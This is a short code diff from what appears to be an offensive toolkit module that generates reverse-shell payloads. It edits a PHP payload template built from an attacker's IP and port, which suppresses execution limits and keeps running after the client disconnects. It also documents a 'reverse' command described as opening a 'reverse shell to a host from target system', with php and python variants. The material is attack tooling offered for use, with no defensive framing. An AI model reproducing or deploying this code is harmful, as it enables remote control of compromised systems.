@@ -6,8 +6,7 @@ from libs.myapp import delay_send, has_env, is_windows, send, get_system_code
 
 
 def get_reverse_php(ip: str, port: str):
-    return """error_reporting (E_ERROR);
-ignore_user_abort(true);
+    return """ignore_user_abort(true);
 ini_set("max_execution_time",0);
 $os = substr(PHP_OS,0,3);
 $ipaddr = "%s";
@@ -139,6 +138,10 @@ def run(ip: str, port: str, reverse_type: str = "php"):
     reverse shell to a host from target system.
 
     eg: reverse {ip} {port} {type=php}
+
+    reverse_type:
+      - php
+      - python
     """
     reverse_type = str(reverse_type).lower()
     if reverse_type == "php":
